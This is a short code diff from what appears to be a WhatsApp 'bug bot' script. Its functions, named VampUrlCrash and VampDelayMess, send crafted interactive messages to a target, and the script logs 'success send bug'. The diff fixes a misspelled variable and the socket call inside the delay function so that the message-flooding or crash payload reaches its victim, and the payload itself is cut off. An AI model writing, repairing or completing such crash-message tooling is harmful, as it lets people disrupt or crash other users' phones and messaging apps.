@@ -1967,7 +1967,7 @@ async function VampUrlCrash(target, Ptcp = true) {
     console.log(chalk.blue(" success send bug "))
 }
 async function VampDelayMess(target, Ptcp = true) {
-      await vamp.relayMessage(tatget, {
+      await sock.relayMessage(target, {
         ephemeralMessage: {
           message: {
             interactiveMessage: {
